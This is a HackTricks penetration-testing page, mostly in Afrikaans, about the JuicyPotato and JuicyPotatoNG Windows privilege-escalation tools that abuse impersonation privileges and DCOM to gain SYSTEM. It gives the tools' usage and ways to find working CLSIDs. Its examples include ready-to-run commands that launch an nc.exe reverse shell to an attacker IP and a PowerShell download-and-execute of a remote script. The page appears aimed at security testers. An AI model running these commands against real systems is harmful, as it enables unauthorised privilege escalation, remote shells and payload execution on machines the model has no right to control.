# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is verouderd. Dit werk oor die algemeen op Windows-weergawes tot Windows 10 1803 / Windows Server 2016. Microsoft-aanpassings wat begin met Windows 10 1809 / Server 2019 het die oorspronklike tegniek gebreek. Vir daardie builds en nuwer, oorweeg moderne alternatiewe soos PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato en ander. Sien die bladsy hieronder vir op-datum opsies en gebruik.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (misbruik van die goue voorregte) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_'n gesuikerde weergawe van_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, met 'n bietjie ekstra, d.w.s. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### Jy kan juicypotato aflaai vanaf [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Kompatibiliteit - vinnige notas

- Werk betroubaar op Windows-weergawes tot Windows 10 1803 en Windows Server 2016 wanneer die huidige konteks SeImpersonatePrivilege of SeAssignPrimaryTokenPrivilege het.
- Gebreek deur Microsoft-hardening in Windows 10 1809 / Windows Server 2019 en later. Gebruik die alternatiewe hierbo vir daardie weergawes.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Ons het besluit om RottenPotatoNG te weaponize: sê hallo vir Juicy Potato.

> Vir die teorie, sien [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) en volg die ketting van skakels en verwysings.

Ons het ontdek dat, behalwe `BITS`, daar verskeie COM servers is wat ons kan misbruik. Hulle moet net:

1. instansieerbaar wees deur die huidige gebruiker, normaalweg 'n “service user” wat impersonation privileges het
2. die `IMarshal` interface implementeer
3. loop as 'n verhoogde gebruiker (SYSTEM, Administrator, …)

Na sommige toetsing het ons 'n uitgebreide lys van [interessante CLSID’s](http://ohpe.it/juicy-potato/CLSID/) op verskeie Windows-weergawes verkry en getoets.

### Sappige besonderhede <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato laat jou toe om:

- **Target CLSID** _kies enige CLSID wat jy wil._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _hier kan jy die lys volgens OS gevind kry._
- **COM Listening port** _definieer die COM-luisterpoort wat jy verkies (in plaas van die gemarsjalleerde hardgekodeerde 6666)_
- **COM Listening IP address** _bind die bediener aan enige IP_
- **Process creation mode** _afhangend van die geïmpersonifiseerde gebruiker se voorregte kan jy kies uit:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _voer 'n uitvoerbare of script uit indien die uitbuiting slaag_
- **Process Argument** _pas die gelanseerde proses se argumente aan_
- **RPC Server address** _vir 'n stilswyende benadering kan jy by 'n eksterne RPC-bediener outentiseer_
- **RPC Server port** _nuttig as jy by 'n eksterne bediener wil outentiseer en die firewall poort `135` blokkeer…_
- **TEST mode** _hoofsaaklik vir toetsdoeleindes, bv. om CLSIDs te toets. Dit skep die DCOM en druk die gebruiker van die token. Sien_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Gebruik <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Laaste gedagtes <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

As die gebruiker `SeImpersonate` of `SeAssignPrimaryToken` voorregte het, dan is jy **SYSTEM**.

Dit is byna onmoontlik om die misbruik van al hierdie COM Servers te voorkom. Jy kan oorweeg om die permissies van hierdie objektië via `DCOMCNFG` te wysig, maar sterkte — dit gaan uitdagend wees.

Die werklike oplossing is om sensitiewe rekeninge en toepassings wat onder die `* SERVICE` rekeninge loop, te beskerm. Om `DCOM` te stop sou hierdie exploit beslis belemmer, maar dit kan 'n ernstige impak op die onderliggende OS hê.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG herintroduceer 'n JuicyPotato-style local privilege escalation op moderne Windows deur die volgende te kombineer:
- DCOM OXID resolution na 'n plaaslike RPC-server op 'n gekose poort, wat die ou hardgekodeerde 127.0.0.1:6666 listener vermy.
- 'n SSPI hook om die inkomende SYSTEM-authentisering te vang en na te boots sonder om RpcImpersonateClient te benodig, wat ook CreateProcessAsUser moontlik maak wanneer slegs SeAssignPrimaryTokenPrivilege teenwoordig is.
- Truuks om aan DCOM activation constraints te voldoen (bv. die voormalige INTERACTIVE-group vereiste wanneer PrintNotify / ActiveX Installer Service klasse geteiken word).

Belangrike notas (gedrag wat oor verskeie builds ontwikkel):
- September 2022: Die aanvanklike tegniek het gewerk op ondersteunde Windows 10/11- en Server-teikens met die “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft het later die INTERACTIVE trick geblokkeer. 'n Ander CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) herstel die uitbuiting, maar slegs op Windows 11 / Server 2022 volgens hul pos.

Basiese gebruik (meer flags in die help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
As jy Windows 10 1809 / Server 2019 teiken waar die klassieke JuicyPotato gepatch is, verkies die alternatiewe wat bo verbind is (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ens.). NG kan situasie-afhanklik wees, afhangende van die build en diensstatus.

## Voorbeelde

Let wel: Besoek [hierdie bladsy](https://ohpe.it/juicy-potato/CLSID/) vir 'n lys van CLSIDs om te probeer.

### Kry 'n nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell omgekeerd
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Start 'n nuwe CMD (as jy RDP-toegang het)

![](<../../images/image (300).png>)

## CLSID Probleme

Gereeld werk die standaard CLSID wat JuicyPotato gebruik **nie** en die exploit misluk. Gewoonlik verg dit verskeie pogings om 'n **werkende CLSID** te vind. Om 'n lys CLSIDs te kry om vir 'n spesifieke bedryfstelsel te probeer, besoek hierdie bladsy:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Kontroleer CLSIDs**

Eerstens sal jy 'n paar executables nodig hê behalwe juicypotato.exe.

Laai [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) af en laai dit in jou PS-sessie, en laai en voer [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) uit. Daardie script sal 'n lys moontlike CLSIDs skep om te toets.

Laai dan [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) af (verander die pad na die CLSID-lys en na die juicypotato executable) en voer dit uit. Dit sal begin om elke CLSID te probeer, en **wanneer die poortnommer verander, beteken dit dat die CLSID gewerk het**.

**Kontroleer** die werkende CLSIDs **met die parameter -c**

## Verwysings

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
